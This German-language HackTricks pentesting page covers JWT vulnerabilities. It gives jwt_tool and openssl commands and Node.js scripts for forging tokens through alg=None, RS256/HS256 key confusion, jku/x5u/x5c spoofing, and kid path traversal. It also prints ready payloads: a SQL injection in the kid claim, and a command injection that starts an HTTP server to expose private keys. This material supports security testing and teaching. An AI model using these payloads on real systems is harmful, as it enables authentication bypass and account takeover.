# JWT-Schwachstellen (Json Web Tokens)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

**Ein Teil dieses Beitrags basiert auf dem gro√üartigen Beitrag:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor des gro√üartigen Tools zum Pentesten von JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Schnelle Erfolge**

F√ºhren Sie [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) im Modus `Alle Tests!` aus und warten Sie auf gr√ºne Linien
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Wenn Sie Gl√ºck haben, findet das Tool m√∂glicherweise einen Fall, in dem die Webanwendung das JWT falsch √ºberpr√ºft:

![](<../.gitbook/assets/image (935).png>)

Dann k√∂nnen Sie die Anfrage in Ihrem Proxy suchen oder das verwendete JWT f√ºr diese Anfrage mit dem jwt\_ tool dumpen:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
Sie k√∂nnen auch die [**Burp-Erweiterung SignSaboteur**](https://github.com/d0ge/sign-saboteur) verwenden, um JWT-Angriffe von Burp aus zu starten.

### Daten manipulieren, ohne etwas zu √§ndern

Sie k√∂nnen einfach mit den Daten manipulieren, ohne die Signatur zu √§ndern, und √ºberpr√ºfen, ob der Server die Signatur √ºberpr√ºft. Versuchen Sie beispielsweise, Ihren Benutzernamen in "admin" zu √§ndern.

#### **Wird das Token √ºberpr√ºft?**

Um zu √ºberpr√ºfen, ob die Signatur eines JWT √ºberpr√ºft wird:

* Eine Fehlermeldung deutet auf eine laufende √úberpr√ºfung hin; sensible Details in ausf√ºhrlichen Fehlern sollten √ºberpr√ºft werden.
* Eine √Ñnderung auf der zur√ºckgegebenen Seite deutet ebenfalls auf eine √úberpr√ºfung hin.
* Keine √Ñnderung deutet auf keine √úberpr√ºfung hin; dann sollten Sie mit der Manipulation von Payload-Claims experimentieren.

### Herkunft

Es ist wichtig festzustellen, ob das Token serverseitig oder clientseitig generiert wurde, indem Sie die Anforderungshistorie des Proxys √ºberpr√ºfen.

* Tokens, die zuerst auf der Clientseite gesehen werden, deuten darauf hin, dass der Schl√ºssel m√∂glicherweise dem Clientcode zug√§nglich ist, was weitere Untersuchungen erforderlich macht.
* Tokens, die serverseitig entstehen, deuten auf einen sicheren Prozess hin.

### Dauer

√úberpr√ºfen Sie, ob das Token l√§nger als 24 Stunden g√ºltig ist... vielleicht verf√§llt es nie. Wenn ein "exp"-Feld vorhanden ist, √ºberpr√ºfen Sie, ob der Server damit korrekt umgeht.

### Brute-Force HMAC-Schl√ºssel

[**Siehe diese Seite.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### √Ñndern des Algorithmus auf None

Setzen Sie den verwendeten Algorithmus auf "None" und entfernen Sie den Signaturteil.

Verwenden Sie die Burp-Erweiterung "JSON Web Token", um diese Schwachstelle auszuprobieren und verschiedene Werte innerhalb des JWT zu √§ndern (senden Sie die Anforderung an Repeater und im Tab "JSON Web Token" k√∂nnen Sie die Werte des Tokens √§ndern. Sie k√∂nnen auch ausw√§hlen, den Wert des Felds "Alg" auf "None" zu setzen).

### √Ñndern des Algorithmus von RS256(asymmetrisch) auf HS256(symmetrisch) (CVE-2016-5431/CVE-2016-10555)

Der Algorithmus HS256 verwendet den geheimen Schl√ºssel, um jede Nachricht zu signieren und zu √ºberpr√ºfen.\
Der Algorithmus RS256 verwendet den privaten Schl√ºssel, um die Nachricht zu signieren, und verwendet den √∂ffentlichen Schl√ºssel zur Authentifizierung.

Wenn Sie den Algorithmus von RS256 auf HS256 √§ndern, verwendet der Backend-Code den √∂ffentlichen Schl√ºssel als geheimen Schl√ºssel und verwendet dann den HS256-Algorithmus zur √úberpr√ºfung der Signatur.

Dann k√∂nnten wir mit dem √∂ffentlichen Schl√ºssel und der √Ñnderung von RS256 auf HS256 eine g√ºltige Signatur erstellen. Sie k√∂nnen das Zertifikat des Webservers abrufen, indem Sie dies ausf√ºhren:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Neuer √∂ffentlicher Schl√ºssel im Header

Ein Angreifer bettet einen neuen Schl√ºssel im Header des Tokens ein und der Server verwendet diesen neuen Schl√ºssel zur √úberpr√ºfung der Signatur (CVE-2018-0114).

Dies kann mit der "JSON Web Tokens" Burp-Erweiterung durchgef√ºhrt werden.\
(Senden Sie die Anfrage an den Repeater, w√§hlen Sie im Tab "JSON Web Token" "CVE-2018-0114" aus und senden Sie die Anfrage).

### JWKS Spoofing

Die Anweisungen beschreiben eine Methode zur Bewertung der Sicherheit von JWT-Tokens, insbesondere solcher, die einen "jku"-Header-Claim verwenden. Dieser Claim sollte auf eine JWKS (JSON Web Key Set)-Datei verweisen, die den f√ºr die √úberpr√ºfung des Tokens erforderlichen √∂ffentlichen Schl√ºssel enth√§lt.

* **Bewertung von Tokens mit "jku"-Header**:
* √úberpr√ºfen Sie die URL des "jku"-Claims, um sicherzustellen, dass sie zur entsprechenden JWKS-Datei f√ºhrt.
* √Ñndern Sie den Wert des "jku"-Claims im Token so, dass er auf einen kontrollierten Webdienst verweist, der die Beobachtung des Datenverkehrs erm√∂glicht.
* **√úberwachung der HTTP-Interaktion**:
* Die Beobachtung von HTTP-Anfragen an die angegebene URL zeigt die Versuche des Servers, Schl√ºssel von Ihrem bereitgestellten Link abzurufen.
* Bei der Verwendung von `jwt_tool` f√ºr diesen Prozess ist es wichtig, die Datei `jwtconf.ini` mit Ihrem pers√∂nlichen JWKS-Speicherort zu aktualisieren, um die Tests zu erleichtern.
* **Befehl f√ºr `jwt_tool`**:
*   F√ºhren Sie den folgenden Befehl aus, um das Szenario mit `jwt_tool` zu simulieren:

```bash
python3 jwt_tool.py JWT_HIER -X s
```

### √úbersicht √ºber Kid-Probleme

Ein optionaler Header-Claim namens `kid` wird verwendet, um einen bestimmten Schl√ºssel zu identifizieren, was insbesondere in Umgebungen, in denen mehrere Schl√ºssel f√ºr die √úberpr√ºfung der Token-Signatur vorhanden sind, wichtig wird. Dieser Claim hilft bei der Auswahl des geeigneten Schl√ºssels zur √úberpr√ºfung der Signatur eines Tokens.

#### Offenlegung des Schl√ºssels durch "kid"

Wenn der `kid`-Claim im Header vorhanden ist, wird empfohlen, das Webverzeichnis nach der entsprechenden Datei oder deren Varianten zu durchsuchen. Wenn beispielsweise `"kid":"key/12345"` angegeben ist, sollten die Dateien _/key/12345_ und _/key/12345.pem_ im Webstamm gesucht werden.

#### Pfadtraversierung mit "kid"

Der `kid`-Claim kann auch ausgenutzt werden, um durch das Dateisystem zu navigieren, was m√∂glicherweise die Auswahl einer beliebigen Datei erm√∂glicht. Es ist m√∂glich, die Konnektivit√§t zu testen oder Server-seitige Anfragef√§lschungen (SSRF) anhand des √Ñnderns des `kid`-Werts auf bestimmte Dateien oder Dienste durchzuf√ºhren. Das Manipulieren des JWT, um den `kid`-Wert zu √§ndern, w√§hrend die urspr√ºngliche Signatur beibehalten wird, kann mithilfe des `-T`-Flags in jwt_tool erreicht werden, wie unten dargestellt:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Durch die Ausrichtung auf Dateien mit vorhersehbarem Inhalt ist es m√∂glich, ein g√ºltiges JWT zu f√§lschen. Zum Beispiel kann die Datei `/proc/sys/kernel/randomize_va_space` in Linux-Systemen, die den Wert **2** enth√§lt, im `kid`-Parameter mit **2** als symmetrischem Passwort f√ºr die JWT-Generierung verwendet werden.

#### SQL-Injection √ºber "kid"

Wenn der Inhalt des `kid`-Claims verwendet wird, um ein Passwort aus einer Datenbank abzurufen, k√∂nnte eine SQL-Injection durch √Ñndern des `kid`-Payloads erm√∂glicht werden. Ein Beispiel-Payload, der eine SQL-Injection verwendet, um den JWT-Signaturprozess zu √§ndern, lautet:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Diese √Ñnderung zwingt zur Verwendung eines bekannten geheimen Schl√ºssels, `ATTACKER`, f√ºr die JWT-Signatur.

#### OS-Injection √ºber "kid"

Ein Szenario, in dem der `kid`-Parameter einen Dateipfad angibt, der innerhalb eines Befehlsausf√ºhrungskontexts verwendet wird, k√∂nnte zu Remote Code Execution (RCE)-Sicherheitsl√ºcken f√ºhren. Durch das Einschleusen von Befehlen in den `kid`-Parameter ist es m√∂glich, private Schl√ºssel offenzulegen. Ein Beispiel-Payload zur Erzielung von RCE und Schl√ºsseloffenlegung lautet:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u und jku

#### jku

jku steht f√ºr **JWK Set URL**.\
Wenn das Token einen "**jku**" **Header**-Claim verwendet, **√ºberpr√ºfen Sie die bereitgestellte URL**. Diese sollte auf eine URL verweisen, die die JWKS-Datei enth√§lt, die den √∂ffentlichen Schl√ºssel zur √úberpr√ºfung des Tokens enth√§lt. Manipulieren Sie das Token, um den jku-Wert auf einen Webdienst zu verweisen, f√ºr den Sie den Datenverkehr √ºberwachen k√∂nnen.

Zuerst m√ºssen Sie ein neues Zertifikat mit neuen privaten und √∂ffentlichen Schl√ºsseln erstellen.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Dann k√∂nnen Sie beispielsweise [**jwt.io**](https://jwt.io) verwenden, um das neue JWT mit den **erstellten √∂ffentlichen und privaten Schl√ºsseln zu erstellen und den Parameter jku auf das erstellte Zertifikat zu verweisen.** Um ein g√ºltiges jku-Zertifikat zu erstellen, k√∂nnen Sie das Original herunterladen und die erforderlichen Parameter √§ndern.

Sie k√∂nnen die Parameter "e" und "n" aus einem √∂ffentlichen Zertifikat erhalten, indem Sie:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509-URL. Eine URI, die auf eine Reihe von X.509 (einem Zertifikatsformatstandard) √∂ffentlichen Zertifikaten im PEM-Format verweist. Das erste Zertifikat in der Reihe muss dasjenige sein, das zum Signieren dieses JWT verwendet wurde. Die nachfolgenden Zertifikate signieren jeweils das vorherige, wodurch die Zertifikatskette vervollst√§ndigt wird. X.509 ist in RFC 52807 definiert. Der Transport von Zertifikaten erfordert Sicherheit.

Versuchen Sie, **diesen Header in eine URL unter Ihrer Kontrolle zu √§ndern** und √ºberpr√ºfen Sie, ob Anfragen empfangen werden. In diesem Fall **k√∂nnten Sie das JWT manipulieren**.

Um ein neues Token mit einem von Ihnen kontrollierten Zertifikat zu f√§lschen, m√ºssen Sie das Zertifikat erstellen und die √∂ffentlichen und privaten Schl√ºssel extrahieren:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Dann k√∂nnen Sie beispielsweise [**jwt.io**](https://jwt.io) verwenden, um das neue JWT mit den **erstellten √∂ffentlichen und privaten Schl√ºsseln zu erstellen und den Parameter x5u auf das Zertifikat .crt zu verweisen, das erstellt wurde.**

![](<../.gitbook/assets/image (956).png>)

Sie k√∂nnen auch beide Schwachstellen **f√ºr SSRFs missbrauchen**.

#### x5c

Dieser Parameter kann das **Zertifikat in Base64** enthalten:

![](<../.gitbook/assets/image (1119).png>)

Wenn der Angreifer ein selbstsigniertes Zertifikat **generiert und ein gef√§lschtes Token erstellt, das den entsprechenden privaten Schl√ºssel verwendet, und den Wert des Parameters "x5c" durch das neu generierte Zertifikat ersetzt und die anderen Parameter, n√§mlich n, e und x5t, modifiziert, dann w√ºrde das gef√§lschte Token im Wesentlichen vom Server akzeptiert werden.**
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Eingebetteter √∂ffentlicher Schl√ºssel (CVE-2018-0114)

Wenn das JWT einen eingebetteten √∂ffentlichen Schl√ºssel enth√§lt, wie im folgenden Szenario:

![](<../.gitbook/assets/image (624).png>)

Mit dem folgenden Node.js-Skript ist es m√∂glich, einen √∂ffentlichen Schl√ºssel aus diesen Daten zu generieren:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Es ist m√∂glich, einen neuen privaten/√∂ffentlichen Schl√ºssel zu generieren, den neuen √∂ffentlichen Schl√ºssel im Token einzubetten und ihn zu verwenden, um eine neue Signatur zu generieren:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Du kannst das "n" und "e" mit diesem Node.js-Skript erhalten:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### ES256: Offenlegung des privaten Schl√ºssels mit demselben Nonce

Wenn einige Anwendungen ES256 verwenden und denselben Nonce verwenden, um zwei JWTs zu generieren, kann der private Schl√ºssel wiederhergestellt werden.

Hier ist ein Beispiel: [ECDSA: Offenlegung des privaten Schl√ºssels, wenn derselbe Nonce verwendet wird (mit SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

Die JTI (JWT ID) Behauptung bietet einen eindeutigen Identifikator f√ºr ein JWT-Token. Es kann verwendet werden, um das Token vor Wiederholung zu sch√ºtzen.\
Stellen Sie sich jedoch eine Situation vor, in der die maximale L√§nge der ID 4 betr√§gt (0001-9999). Die Anfrage 0001 und 10001 werden dieselbe ID verwenden. Wenn also das Backend die ID bei jeder Anfrage inkrementiert, k√∂nnten Sie dies missbrauchen, um **eine Anfrage zu wiederholen** (es m√ºssen 10000 Anfragen zwischen jeder erfolgreichen Wiederholung gesendet werden).

### JWT Registrierte Behauptungen

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Andere Angriffe

**Cross-Service Relay-Angriffe**

Es wurde beobachtet, dass einige Webanwendungen auf einen vertrauensw√ºrdigen JWT-Dienst zur Generierung und Verwaltung ihrer Tokens angewiesen sind. Es wurden F√§lle dokumentiert, in denen ein Token, das f√ºr einen Client vom JWT-Dienst generiert wurde, von einem anderen Client desselben JWT-Dienstes akzeptiert wurde. Wenn die Ausstellung oder Erneuerung eines JWT √ºber einen Drittanbieterdienst beobachtet wird, sollte die M√∂glichkeit, sich bei einem anderen Client dieses Dienstes mit demselben Benutzernamen/E-Mail anzumelden, untersucht werden. Es sollte dann versucht werden, das erhaltene Token in einer Anfrage an das Ziel zu wiederholen, um zu sehen, ob es akzeptiert wird.

* Die Akzeptanz Ihres Tokens k√∂nnte auf ein kritisches Problem hinweisen, das m√∂glicherweise das Spoofing des Kontos eines beliebigen Benutzers erm√∂glicht. Es sollte jedoch beachtet werden, dass m√∂glicherweise eine Genehmigung f√ºr umfangreichere Tests erforderlich ist, wenn Sie sich bei einer Anwendung eines Drittanbieters anmelden, da dies in eine rechtliche Grauzone geraten k√∂nnte.

**Ablaufpr√ºfung von Tokens**

Der Ablauf des Tokens wird mithilfe der "exp" Payload-Behauptung √ºberpr√ºft. Da JWTs h√§ufig ohne Sitzungsinformationen verwendet werden, ist eine sorgf√§ltige Handhabung erforderlich. In vielen F√§llen k√∂nnte das Erfassen und Wiederholen eines anderen Benutzertokens das Vort√§uschen dieses Benutzers erm√∂glichen. Der JWT RFC empfiehlt, JWT-Wiederholungsangriffe durch die Verwendung der "exp"-Behauptung zur Festlegung einer Ablaufzeit f√ºr das Token zu mildern. Dar√ºber hinaus ist die Implementierung entsprechender √úberpr√ºfungen durch die Anwendung erforderlich, um die Verarbeitung dieses Werts sicherzustellen und abgelaufene Tokens abzulehnen. Wenn das Token eine "exp"-Behauptung enth√§lt und die Testzeiten dies zulassen, wird empfohlen, das Token zu speichern und es nach Ablauf der Ablaufzeit erneut zu senden. Der Inhalt des Tokens, einschlie√ülich der Zeitstempelanalyse und Ablaufpr√ºfung (Zeitstempel in UTC), kann mithilfe des -R-Flags des jwt_tool gelesen werden.

* Ein Sicherheitsrisiko k√∂nnte bestehen, wenn die Anwendung das Token immer noch validiert, da dies darauf hindeuten k√∂nnte, dass das Token niemals abl√§uft.

### Tools

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
